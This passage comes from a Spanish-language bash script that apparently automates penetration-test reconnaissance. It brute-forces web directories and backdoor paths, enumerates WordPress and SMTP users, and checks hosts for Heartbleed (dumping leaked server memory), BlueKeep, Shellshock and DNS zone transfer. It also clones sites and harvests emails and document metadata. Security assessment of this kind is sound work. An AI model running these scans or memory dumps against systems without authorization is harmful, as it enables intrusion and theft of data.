								web-buster.pl -t $subdominio -p $port -h 2 -d / -m phpinfo -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/$subdominio-$port-phpinfo.txt 2>/dev/null &
							fi						
							####################################	
							
							#######  if the server is IIS ######
							grep -i IIS .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "302 Found" # no redirecciona
							greprc=$?
							if [[ $greprc -eq 0 && ! -f .enumeracion/$subdominio-$port-webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes							
								echo -e "\t[+] Revisando directorios y archivos comunes (IIS)"					
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m admin -s 1 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
								sleep 2
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &	
								sleep 2
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m sharepoint -s 1 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &	
								sleep 2
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m webservices -s 1 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &
								sleep 2
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m backdoorsIIS -s 1 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$subdominio-$port-backdoor.txt  &
								sleep 2
								web-buster.pl -t $subdominio -p $port -h 3 -d / -m backupIIS -s 1 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$subdominio-$port-backdoor.txt  &
								sleep 2										   
							fi
										
							####################################	
		
		
							#######  if the server is tomcat ######
							egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/$subdominio-$port-webData.txt | egrep -qiv "302 Found" 
							greprc=$?				
							if [[ $greprc -eq 0 && ! -f .enumeracion/$subdominio-$port-webarchivos.txt  ]];then # si el banner es Java y no se enumero antes
								echo -e "\t[+] Revisando directorios y archivos comunes (JSP)"
								web-buster.pl -t $subdominio -p $port -h 5 -d / -m tomcat -s 1 -q 1 | egrep --color=never "^200|^301|^401|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &			
								web-buster.pl -t $subdominio -p $port -h 5 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$subdominio-$port-webarchivos.txt  &										
								sleep 1										
							fi
										
							####################################
								
						
							#######  wordpress (dominio) ######
							grep -qi wordpress .enumeracion/$subdominio-$port-webData.txt
							greprc=$?
							if [[ $greprc -eq 0 ]];then 		
								echo -e "\t\t[+] Revisando vulnerabilidades de wordpress"						    
								wpscan --url https://$subdominio/ --enumerate u --follow-redirection > .enumeracion/$subdominio-$port-wpscan.txt &
							fi
							###########################	
							
							#######  joomla (domain) ######
							grep -qi joomla .enumeracion/$subdominio-$port-webData.txt
							greprc=$?
							if [[ $greprc -eq 0 ]];then 										
								echo -e "\t[+] Revisando vulnerabilidades de joomla"
								joomscan.sh -u https://$subdominio/ > .enumeracion/$subdominio-$port-joomscan.txt &
							fi
							###################################	
							
							#######  WAMPSERVER (domain) ######
							grep -qi WAMPSERVER .enumeracion/$ip-$port-webData.txt
							greprc=$?
							if [[ $greprc -eq 0 ]];then 										
								echo -e "\t[+] Enumerando WAMPSERVER"
								wampServer.pl -url http://$subdominio/ > .enumeracion/$subdominio-$port-WAMPSERVER.txt &
							fi
							###################################	
							
							#######  hearbleed (dominio) ######						
							echo -e "\t\t[+] Revisando vulnerabilidad heartbleed"
							echo "nmap -n -Pn -p $port --script=ssl-heartbleed $subdominio" > logs/vulnerabilidades/$subdominio-$port-heartbleed.txt 2>/dev/null 
							nmap -n -Pn -p $port --script=ssl-heartbleed $subdominio >> logs/vulnerabilidades/$subdominio-$port-heartbleed.txt 2>/dev/null 
							egrep -qi "VULNERABLE" logs/vulnerabilidades/$subdominio-$port-heartbleed.txt
							greprc=$?
							if [[ $greprc -eq 0 ]] ; then						
								echo -e "\t\ŧ$OKRED[!] Vulnerable a heartbleed \n $RESET"
								grep "|" logs/vulnerabilidades/$subdominio-$port-heartbleed.txt > .vulnerabilidades/$subdominio-$port-heartbleed.txt				
								heartbleed.py $subdominio -p $port 2>/dev/null | head -100 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' > .vulnerabilidades/$subdominio-$port-heartbleedRAM.txt						
							else							
								echo -e "\t\t$OKGREEN[i] No vulnerable a heartbleed $RESET"
							fi
							##########################
						
							#######  clone site (domain) ####### 						
							cd webClone
								echo -e "\t\t[+] Clonando sitio"	
								wget -m -k -U "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --reject gif,jpg,bmp,png,mp4,jpeg,flv,webm,mkv,ogg,gifv,avi,wmv,3gp -T 5 -t 1 -K -E  https://$subdominio
								rm index.html.orig 2>/dev/null
							cd ..						
							###################################												
						else
								echo -e "\t\t[+] Redirección o error de proxy detectado"	
						fi														
						
					done # subdominios 
					
				 cd webClone
					echo -e "\t\t[+] Extrayendo URLs"
					grep --color=never -irao "http://[^ ]*"  * | cut -d ":" -f3 | grep --color=never -ia "$DOMAIN" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > http.txt
					lines=`wc -l http.txt  | cut -d " " -f1`
					perl -E "say \"http://\n\" x $lines" > prefijo.txt # file with the domain (n times)
					paste -d '' prefijo.txt http.txt >> ../logs/enumeracion/$DOMAIN-web-wget2.txt
					rm http.txt
					
					grep --color=never -irao "https://[^ ]*"  * | cut -d ":" -f3 | grep --color=never -ia "$DOMAIN" | grep -v '\?'| cut -d "/" -f3-4 | egrep -iv "galeria|images|plugin" | sort | uniq > https.txt
					lines=`wc -l https.txt  | cut -d " " -f1`
					perl -E "say \"https://\n\" x $lines" > prefijo.txt # file with the domain (n times)
					paste -d '' prefijo.txt https.txt >> ../logs/enumeracion/$DOMAIN-web-wget2.txt
					rm https.txt
				 
					#grep --color=never -irao "http://[^ ]*"  * | egrep -av "fontawesome|adobe|w3\.org|fontello|sil.org|campivisivi|isiaurbino|scriptype|tht|mit-license|HttpRequest|http-equiv|css|png|angularjs|example|openstreet|zkysky|angular-leaflet|angular-formly|yahoo|spotify|twitch|instagram|facebook|live.com|chieffancypants|angular-ui" | tr -d '>' | sort | uniq >> ../enumeracion/$DOMAIN-web-wget2.txt
					#grep --color=never -irao "https://[^ ]*"  * | egrep -av "fontawesome|adobe|w3\.org|fontello|sil.org|campivisivi|isiaurbino|scriptype|tht|mit-license|HttpRequest|http-equiv|css|png|angularjs|example|openstreet|zkysky|angular-leaflet|angular-formly|yahoo|spotify|twitch|instagram|facebook|live.com|chieffancypants|angular-ui" | tr -d '>' | sort | uniq >> ../enumeracion/$DOMAIN-web-wget2.txt
				cd ../								
			  fi # revisar por dominio
				################################
					
				######## heartbleed (IP) ##########
				echo -e "\t[+] Revisando vulnerabilidad heartbleed"
				echo "nmap -n -Pn -p $port --script=ssl-heartbleed $ip" > logs/vulnerabilidades/$ip-$port-heartbleed.txt 2>/dev/null 
				nmap -n -Pn -p $port --script=ssl-heartbleed $ip >> logs/vulnerabilidades/$ip-$port-heartbleed.txt 2>/dev/null 
				egrep -qi "VULNERABLE" logs/vulnerabilidades/$ip-$port-heartbleed.txt
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then						
					echo -e "\t$OKRED[!] Vulnerable a heartbleed \n $RESET"
					grep "|" logs/vulnerabilidades/$ip-$port-heartbleed.txt > .vulnerabilidades/$ip-$port-heartbleed.txt				
					heartbleed.py $ip -p $port 2>/dev/null | head -100 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' > .vulnerabilidades/$ip-$port-heartbleedRAM.txt						
				else
					echo -e "\t$OKGREEN[i] No vulnerable a heartbleed $RESET"
				fi
				###################################	
				
				#######  wordpress (IP) ######
				grep -qi wordpress .enumeracion/$ip-$port-webData.txt
				greprc=$?
				if [[ $greprc -eq 0 ]];then 		
					echo -e "\t[+] Revisando vulnerabilidades de wordpress"
					wpscan  --update
					wpscan --url https://$subdominio/ --enumerate u > .enumeracion/$subdominio-$port-wpscan.txt &
				fi
				###########################	
				
				#######  joomla (domain) ######
				grep -qi joomla .enumeracion/$ip-$port-webData.txt
				greprc=$?
				if [[ $greprc -eq 0 ]];then 										
					echo -e "\t[+] Revisando vulnerabilidades de joomla"
					joomscan.sh -u https://$ip/ > .enumeracion/$ip-$port-joomscan.txt &
				fi
				###################################	
				
				#######  WAMPSERVER (ip) ######
				grep -qi WAMPSERVER .enumeracion/$ip-$port-webData.txt
				greprc=$?
				if [[ $greprc -eq 0 ]];then 										
					echo -e "\t[+] Enumerando WAMPSERVER"
					wampServer.pl -url https://$ip/ > .enumeracion/$ip-$port-WAMPSERVER.txt &
				fi
				###################################	
					
																							
				#######  if the server is apache ######
				egrep -i "apache" .enumeracion/$ip-$port-webData.txt | egrep -ivq "cisco|BladeSystem|oracle|Coyote|Express"
				greprc=$?				
				if [[ $greprc -eq 0 && ! -f .enumeracion/$ip-$port-webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes
					
					echo -e "\t[+] Revisando directorios y archivos comunes (Apache)"
					web-buster.pl -t $ip -p $port -h 3 -d / -m admin -s 1 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m webserver -s 1 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m backupApache -s 1 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m cgi -s 1 -q 1 | egrep --color=never "^200|^401|^301|^302" | awk '{print $2}' >> .servicios/cgi.txt  &
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m archivosPeligrosos -s 1 -q 1 | egrep --color=never "^200|^401|^301|^302" | awk '{print $2}' >> .vulnerabilidades/$ip-$port-archivosPeligrosos.txt  &
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m backdoorApache -s 1 -q 1 | egrep --color=never "^200|^401|^301|^302" | awk '{print $2}' >> .vulnerabilidades/$ip-$port-backdoor.txt  &
					sleep 2
					web-buster.pl -t $ip -p $port -h 2 -d / -m phpinfo -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/$ip-$port-phpinfo.txt 2>/dev/null &	
				fi						
				####################################
		
				#######  if the server is IIS ######
				grep -qi IIS .enumeracion/$ip-$port-webData.txt | egrep -qiv "302 Found" 
				greprc=$?
				if [[ $greprc -eq 0 && ! -f .enumeracion/$ip-$port-webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes					
					echo -e "\n### $ip:$port ( IIS - HTTPsys)"
					nmap -n -Pn -p $port --script http-vuln-cve2015-1635 $ip > logs/vulnerabilidades/$ip-$port-HTTPsys.txt 2>/dev/null 
					grep "|" logs/vulnerabilidades/$ip-$port-HTTPsys.txt > .vulnerabilidades/$ip-$port-HTTPsys.txt 
					
					echo -e "\t[+] Revisando directorios y archivos comunes (IIS)"					
					web-buster.pl -t $ip -p $port -h 3 -d / -m admin -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &	
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m sharepoint -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &	
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m webservices -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m backdoorsIIS -s 0 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$ip-$port-backdoor.txt  &
					sleep 2
					web-buster.pl -t $ip -p $port -h 3 -d / -m backupIIS -s 0 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/$ip-$port-backdoor.txt  &											
									
				fi
									
				####################################
				
				#######  if the server is java ######
				egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/$ip-$port-webData.txt | egrep -qiv "302 Found" 
				greprc=$?				
				if [[ $greprc -eq 0 && ! -f .enumeracion/$ip-$port-webarchivos.txt  ]];then # si el banner es JAVA y no se enumero antes				
					echo -e "\t[+] Revisando directorios y archivos comunes (tomcat)"						
					web-buster.pl -t $ip -p $port -h 5 -d / -m tomcat -s 0 -q 1 | egrep --color=never "^200|^301|^401|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &			
					web-buster.pl -t $ip -p $port -h 5 -d / -m webserver -s 0 -q 1 | egrep --color=never "^200|^401|^301|^302" >> .enumeracion/$ip-$port-webarchivos.txt  &										
					sleep 1						
				fi									
				####################################	
					break
			else
				perl_instancias=`ps aux | grep perl | wc -l`
				echo -e "\t[-] Poca RAM ($free_ram Mb). Maximo número de instancias de nmap ($perl_instancias) "
				sleep 3
			fi
    	done	# done true					
   done #for

					
	# revisar si hay scripts ejecutandose
	while true; do
	webbuster_instancias=`ps aux | egrep 'wampServer|buster|nmap|joomscan|wpscan' | wc -l`		
	if [ "$webbuster_instancias" -gt 1 ]
	then
		echo -e "\t[i] Todavia hay scripts activos ($webbuster_instancias)"				
		sleep 20
		else
			break		
		fi
	done	# done true	
	
	#insert clean data	
	insert_data   		
fi

#  Eliminar URLs repetidas (clonacion)
echo -e "[+] Eliminar URLs repetidas (Extraidos de la clonacion)"										
sort logs/enumeracion/$DOMAIN-web-wget2.txt 2>/dev/null | uniq > .enumeracion/$DOMAIN-web-wgetURLs.txt
insert_data

#### copiar archivos con metadata y extraerlos ########
echo -e "[+] Extraer metadatos con exiftool"										
cd webClone	
	find . -name "*.pdf" -exec cp {} "../archivos" \;
	find . -name "*.xls" -exec cp {} "../archivos" \;
	find . -name "*.doc" -exec cp {} "../archivos" \;
	find . -name "*.ppt" -exec cp {} "../archivos" \;
	find . -name "*.pps" -exec cp {} "../archivos" \;
	find . -name "*.docx" -exec cp {} "../archivos" \;
	find . -name "*.pptx" -exec cp {} "../archivos" \;
	find . -name "*.xlsx" -exec cp {} "../archivos" \;
cd ../	
exiftool archivos | egrep -i "Author|creator" | egrep -iv "tool|adobe|microsoft|PaperStream|Acrobat|JasperReports" | awk '{print $3}' |sort |uniq > .enumeracion/$DOMAIN-metadata-exiftool.txt

# filtrar error de conexion a base de datos y otros errores
egrep -ira --color=never "mysql_query| mysql_fetch_array|access denied for user|mysqli|Undefined index" webClone/* 2>/dev/null| sed 's/webClone\///g' >> .enumeracion/$DOMAIN-web-errores.txt

# correos presentes en los sitios web
grep -Eirao "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" * | cut -d ":" -f2 | egrep --color=never $"com|net|org|bo|es" |  sort |uniq  >> .enumeracion/$DOMAIN-correos-web.txt

insert_data
find .servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
###################



if [ -f .servicios/rdp.txt ]
then
    
    #if [ $rdp == "s" ] ; then	
		#mkdir -p screenshots
		echo -e "$OKBLUE #################### RDP (`wc -l .servicios/rdp.txt`) ######################$RESET"	  
		for line in $(cat .servicios/rdp.txt); do
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`				
			#nmap -Pn -p $port $ip --script=rdp-enum-encryption > .enumeracion/$ip/rdp.txt 2>/dev/null					
			echo -e "[+] Escaneando $ip:$port"	
			echo -e "\t[+] Revisando vulnerabilidad blueKeep"
			blueKeep $ip >> logs/vulnerabilidades/$ip-3389-RDPvuln.txt
			grep "VULNERABLE" logs/vulnerabilidades/$ip-3389-RDPvuln.txt  > .vulnerabilidades/$ip-3389-RDPvuln.txt
			
			echo -e "\t[+] Revisando vulnerabilidad MS12-020"
			nmap -sV -Pn --script=rdp-vuln-ms12-020 -p 3389 $ip > logs/vulnerabilidades/$ip-3389-ms12020.txt
			grep "|" logs/vulnerabilidades/$ip-3389-ms12020.txt > .vulnerabilidades/$ip-3389-ms12020.txt
			
			while true; do
				free_ram=`free -m | grep -i mem | awk '{print $7}'`
				if [ "$free_ram" -gt 300 ]			
				then					
					echo -e "\t [+] Obteniendo Certificado SSL"		
					#rdpscreenshot -o `pwd`/screenshots/ $ip 2>/dev/null			
					get_ssl_cert.py $ip $port 2>/dev/null | grep --color=never "("> .enumeracion/$ip-$port-cert.txt  &
					sleep 0.2
					break
				else
					python_instancias=`pgrep get_ssl_cert | wc -l`
					echo -e "\t[-] Poca RAM ($free_ram Mb). Maximo número de instancias de python ($python_instancias)"
					sleep 3
				fi
			done	# done true	
			
		done	
	#fi   
	
	# revisar si hay scripts ejecutandose
	while true; do
	webbuster_instancias=`ps aux | egrep 'get_ssl_cert|buster|nmap' | wc -l`		
	if [ "$webbuster_instancias" -gt 1 ]
	then
		echo -e "\t[i] Todavia hay scripts activos ($webbuster_instancias)"				
		sleep 20
		else
			break		
		fi
	done	# done true	
	
	#insert clean data	
	insert_data	 		
fi

########## revisando PROPFIND (webdav) ###
grep PROPFIND .enumeracion2/* 2>/dev/null| while read -r line ; do
	echo -e "[+] Método PROPFIND detectado"		
    archivo_origen=`echo $line | cut -d ':' -f1`
    archivo_destino=$archivo_origen       
	archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}   
	archivo_destino=${archivo_destino/webarchivos/webdav}   	
    contenido=`echo $line | cut -d ':' -f2-4`    
    echo $contenido > $archivo_destino    
done
insert_data
#################################


########## extrayendo informacion de phpinfo ###
for archivo in `ls logs/enumeracion/*-phpinfo.txt 2>/dev/null;`; do	
	#archivo = logs/enumeracion/190.186.131.162-443-phpinfo.txt	
	#archivo2 = 190.186.131.162-443-phpinfo.txt
	archivo2=`echo $archivo | cut -f3 -d"/"`	
	ip=`echo $archivo2 | cut -f1 -d"-"`
	port=`echo $archivo2 | cut -f2 -d"-"`
	
	echo -e "[+] Extrayendo información de phpinfo ($ip:$port)"

	for url in `cat $archivo`; do	
		phpinfo.pl -url "\"$url\"" >> logs/vulnerabilidades/$ip-$port-phpinfo.txt 2>/dev/null
	done
  
	egrep -iq "No es un archivo PHPinfo" logs/vulnerabilidades/$ip-$port-phpinfo.txt
	greprc=$?
	if [[ $greprc -eq 0 ]] ; then			
		echo -e "\t[i] No es un archivo phpinfo valido"				
	else
		echo "URL  $url" >> .vulnerabilidades/$ip-$port-phpinfo.txt
		echo ""  >> .vulnerabilidades/$ip-$port-phpinfo.txt
		cat logs/vulnerabilidades/$ip-$port-phpinfo.txt >> .vulnerabilidades/$ip-$port-phpinfo.txt
	fi										
done
insert_data
#################################


if [ -f .servicios/ftp.txt ]
then
	echo -e "$OKBLUE #################### FTP (`wc -l .servicios/ftp.txt`) ######################$RESET"	    
	touch 68b329da9893e34099c7d8ad5cb9c940.txt # file to test upload
	for line in $(cat .servicios/ftp.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo -e "[+] Escaneando $ip:$port"		
		#nmap -n -sV -Pn -p $port $ip --script=ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 > .enumeracion/$ip-ftp-vuln.txt 2>/dev/null &
		echo -e "\t[+] Obtener banner"	
		echo -e "\tLIST" | nc -w 3 $ip $port > .enumeracion/$ip-$port-banner.txt 2>/dev/null 
		
		######## revisar si no es impresora #####		
		egrep -iq "Printer|JetDirect|LaserJet|HP|KONICA|MULTI-ENVIRONMENT" .enumeracion2/$ip-80-webData.txt 2>/dev/null
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t$OKGREEN[i] Es una impresora $RESET"
		else					
			egrep -iq "Printer|JetDirect|LaserJet|HP|KONICA|MULTI-ENVIRONMENT" .enumeracion2/$ip-23-webData.txt 2>/dev/null
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t$OKGREEN[i] Es una impresora $RESET"
			else							
				echo -e "\t[+] Comprobando usuario anonymous"
				ftp-anonymous.pl -t $ip -f 68b329da9893e34099c7d8ad5cb9c940.txt > logs/vulnerabilidades/$ip-21-anonymous.txt 2>/dev/null 
				cp logs/vulnerabilidades/$ip-21-anonymous.txt .vulnerabilidades/$ip-21-anonymous.txt
				sleep 5
			fi
		fi	
		#######################################
		
	done	
	rm 68b329da9893e34099c7d8ad5cb9c940.txt 2>/dev/null

	#insert clean data	
	insert_data
	
fi


if [ -f .servicios/cgi.txt ]
then
        		
		echo -e "$OKBLUE #################### CGI (`wc -l .servicios/cgi.txt`) ######################$RESET"	  
		for line in $(cat .servicios/cgi.txt); do
			ip=`echo $line |  cut -d ":" -f 2 | tr -d /`
			path=`echo $line | cut -d ":" -f 3 | sed 's/80//g'`	
			echo -e "[+] Escaneando $ip:80"	
			echo -e "\t [+] Revisando vulnerabilidad Shellsock ip=$ip path=$path"
				
			echo "nmap -sV -p80 --script http-shellshock.nse --script-args uri=$path $ip" > logs/vulnerabilidades/$ip-80-shellshock.txt
			nmap -sV -p80 --script http-shellshock.nse --script-args uri=$path $ip >> logs/vulnerabilidades/$ip-80-shellshock.txt
			grep "|" logs/vulnerabilidades/$ip-80-shellshock.txt  > .vulnerabilidades/$ip-80-shellshock.txt	
			
			if [ -s .vulnerabilidades/$ip-80-shellshock.txt ] # if FILE exists and has a size greater than zero.
			then
				echo -e "\t$OKRED[!] Vulnerable a Shellsock \n $RESET" 
				echo -e "\t\n URL: http://$ip$path \n"  > .vulnerabilidades/$ip-80-shellshock.txt
				grep "|" logs/vulnerabilidades/$ip-80-shellshock.txt  >> .vulnerabilidades/$ip-80-shellshock.txt	
			else				
				echo -e "\t$OKGREEN[i] No vulnerable a Shellsock $RESET"
			fi
			
		done
	
	#insert clean data	
	insert_data		 	
fi

if [ -f .servicios/cgi-ssl.txt ]
then
        		
		echo -e "$OKBLUE #################### Shellsock (`wc -l .servicios/cgi-ssl.txt`) ######################$RESET"	  
		for line in $(cat .servicios/cgi-ssl.txt); do
			ip=`echo $line |  cut -d ":" -f 2 | tr -d /`
			path=`echo $line | cut -d ":" -f 3 | sed 's/443//g'`
			if [ $ip != "200" ]
			then 			
				echo -e "[+] Escaneando $ip:443"	
				echo -e "\t [+] Revisando vulnerabilidad Shellsock ip=$ip path=$path"		
				echo "nmap -sV -p443 --script http-shellshock.nse --script-args uri=$path $ip" > logs/vulnerabilidades/$ip-443-shellshock.txt
				nmap -sV -p443 --script http-shellshock.nse --script-args uri=$path $ip >> logs/vulnerabilidades/$ip-443-shellshock.txt
				grep "|" logs/vulnerabilidades/$ip-443-shellshock.txt  > .vulnerabilidades/$ip-443-shellshock.txt			
			fi			
		done		
	
	#insert clean data		
	insert_data
	
fi


if [ -f .servicios/dns.txt ]
then
	echo -e "$OKBLUE #################### DNS (`wc -l .servicios/dns.txt`) ######################$RESET"	  
	for line in $(cat .servicios/dns.txt); do
		ip=`echo $line | cut -f1 -d":"`
		echo -e "[+] Escaneando $ip:$port"	
		echo -e "\t [+] Probando transferencia de zona"
			
		#resolve IP - dominio
		dominio=`dig -x $ip @$ip| egrep "PTR|SOA" | egrep -iv ";|adsl|mobile|static|host-|LACNIC|tld" | head -1 | awk '{print $5}'`
		
		if [[ ${dominio} != "" && ${dominio} != *"local"*  && ${dominio} != *"arpa"*  ]];then
			#remove subdominio
			set -- "$dominio" 
			IFS="."; declare -a Array=($*) 	
			array_len=${#Array[@]}
			IFS=" ";
			sub2=${Array[$array_len - 2]} # dominio ó com
			sub3=${Array[$array_len - 1]} # com ó bo
	
			if [[ ${sub3} == "bo" ]] && [[ "$sub2" == "com" || "$sub2" == "org" || "$sub2" == "gob" || "$sub2" == "edu" ]];then
				sub1=${Array[$array_len - 3]}"." # dominio
			fi				        		

			dominio=$sub1$sub2.$sub3
			echo -e "\t[+] Dominio = $dominio"	
						
			
			### zone transfer ###			
			zone_transfer=`dig -tAXFR @$ip $dominio`
			echo "dig -tAXFR @$ip $dominio" > logs/vulnerabilidades/$ip-53-transferenciaDNS.txt 
			echo $zone_transfer >> logs/vulnerabilidades/$ip-53-transferenciaDNS.txt 
			if [[ ${zone_transfer} != *"failed"*  && ${zone_transfer} != *"timed out"* && ${zone_transfer} != *"error"* ]];then
				echo $zone_transfer > .vulnerabilidades/$ip-53-transferenciaDNS.txt 
				echo -e "\t$OKRED[!] Transferencia de zona detectada \n $RESET"
			else
				
				echo -e "\t$OKGREEN[i] No hay zona detectada $RESET"
			fi	
			
			#open resolver
			echo -e "\t [+] Probando si es un servidor DNS openresolver"
			dig ANY google.com @$ip +short | grep --color=never google > .vulnerabilidades/$ip-53-openresolver.txt 2>/dev/null &														
		fi					
		
	done
	
	# revisar si hay scripts ejecutandose
	while true; do
	dig_instancias=`ps aux | egrep 'dig' | wc -l`		
	if [ "$dig_instancias" -gt 1 ]
	then
		echo -e "\t[i] Todavia hay scripts activos ($dig_instancias)"				
		sleep 20
		else
			break		
		fi
	done	# done true	
	#insert clean data	
	insert_data		
fi


	
## Procesar los usuarios enumerados con smtp-user-enum
if [ -f .servicios/smtp.txt ]
	then
		echo -e "$OKBLUE #################### SMTP (`wc -l .servicios/smtp.txt`) ######################$RESET"	    
		
		# revisar si hay scripts ejecutandose
		echo -e "[+] Verificar si se esta ejecutando smtp-user-enum"
		while true; do
			smtp_user_enum_instancias=`ps aux | egrep 'smtp-user-enum' | wc -l`		
			if [ "$smtp_user_enum_instancias" -gt 1 ]
			then
				echo -e "\t[-] Todavia esta smtp-user-enum activo ($smtp_user_enum_instancias)"				
				sleep 20
			else
				break		
			fi
		done	# done true	


		while read line
		do  	
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`					
			echo -e "[+]  $ip:$port"
			egrep -iq "User unknown" logs/vulnerabilidades/$ip-$port-vrfy.txt 
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then							
				grep --color=never "exists" logs/vulnerabilidades/$ip-$port-vrfyEnum.txt > .vulnerabilidades/$ip-$port-vrfyEnum.txt					
				echo -e "\t$OKRED[!] Se enumero usuarios mediante el comando VRFY \n $RESET"
			else				
				echo -e "\t$OKGREEN[i] No se encontro usuarios $RESET"
			fi
		done <.servicios/smtp.txt	
		insert_data
fi		 


############### banners #######
echo ""
echo -e "$OKBLUE ############# Obteniendo banners de los servicios ############## $RESET"
getBanners.pl -l .datos/total-host-vivos.txt -t .nmap/nmap-tcp.grep


######## wait to finish########
  while true; do
	nmap_instancias=$((`ps aux | grep nmap | wc -l` - 1)) 
  if [ "$nmap_instancias" -gt 0 ]
	then
		echo -e "\t[i] Todavia hay escaneos de nmap activos ($nmap_instancias)"  
		sleep 30
	else
		break		  		 
	fi				
  done
##############################
	  
	cat .nmap_banners/*.grep > .nmap/nmap-tcp-banners.grep
	cat .nmap_banners/*.txt > reportes/nmap-tcp-banners.txt


	cd .nmap		
	grep -i "MikroTik" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/MikroTik2.txt
	grep ' 8728/open' nmap-tcp.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/MikroTik2.txt 
	sort ../.servicios/MikroTik2.txt | sort | uniq > ../.servicios/MikroTik.txt; rm ../.servicios/MikroTik2.txt
	
	grep -i "d-link" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/d-link2.txt
	grep -i "forti" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/fortinet2.txt
	grep -i "3com" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/3com2.txt
	grep -i "linksys" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/linksys2.txt
	grep -i "Netgear" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/Netgear.txt
	grep -i "zyxel" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/zyxel.txt
	grep -i "ZTE" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/ZTE2.txt
	grep -i "UPS devices or Windows" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/ZTE2.txt
	grep -i "TP-link" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/tp-link.txt
	grep -i "cisco" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/cisco.txt
	grep -i "ASA" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/ciscoASA.txt	
	grep -i "samba" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/samba.txt
	grep -i "Allegro RomPager" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/RomPager.txt
	grep -i "NetScreen" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../.servicios/NetScreen.txt #juniper
